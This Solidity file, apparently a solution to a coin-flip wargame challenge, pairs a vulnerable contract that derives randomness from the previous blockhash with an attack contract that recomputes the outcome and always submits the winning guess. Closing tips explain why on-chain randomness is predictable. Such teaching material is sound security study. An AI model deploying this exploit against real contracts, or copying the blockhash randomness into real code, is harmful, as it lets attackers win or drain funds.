pragma solidity ^0.5.0;
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol";

//Main Contract

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}


//Attack contract

contract pseudoCoinFlip {

    using SafeMath for uint256;
    CoinFlip public rca = CoinFlip(0xAD192253839cc67fdb3D90bBC38190Cb8a24a9eA); //deployed address of main contract
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function pseudoGuess (bool _myGuess) public{

    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);

    //calculate the outcome beforehand!!

    bool side = coinFlip == 1 ? true : false;

    if (side == _myGuess) {
      rca.flip(_myGuess);
    } else {
      rca.flip(!_myGuess);
    }

   }
}








TIPS : Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in
       smart contracts is publicly visible, including the local variables and state variables marked as private.
       Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.

       Some options include using Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize).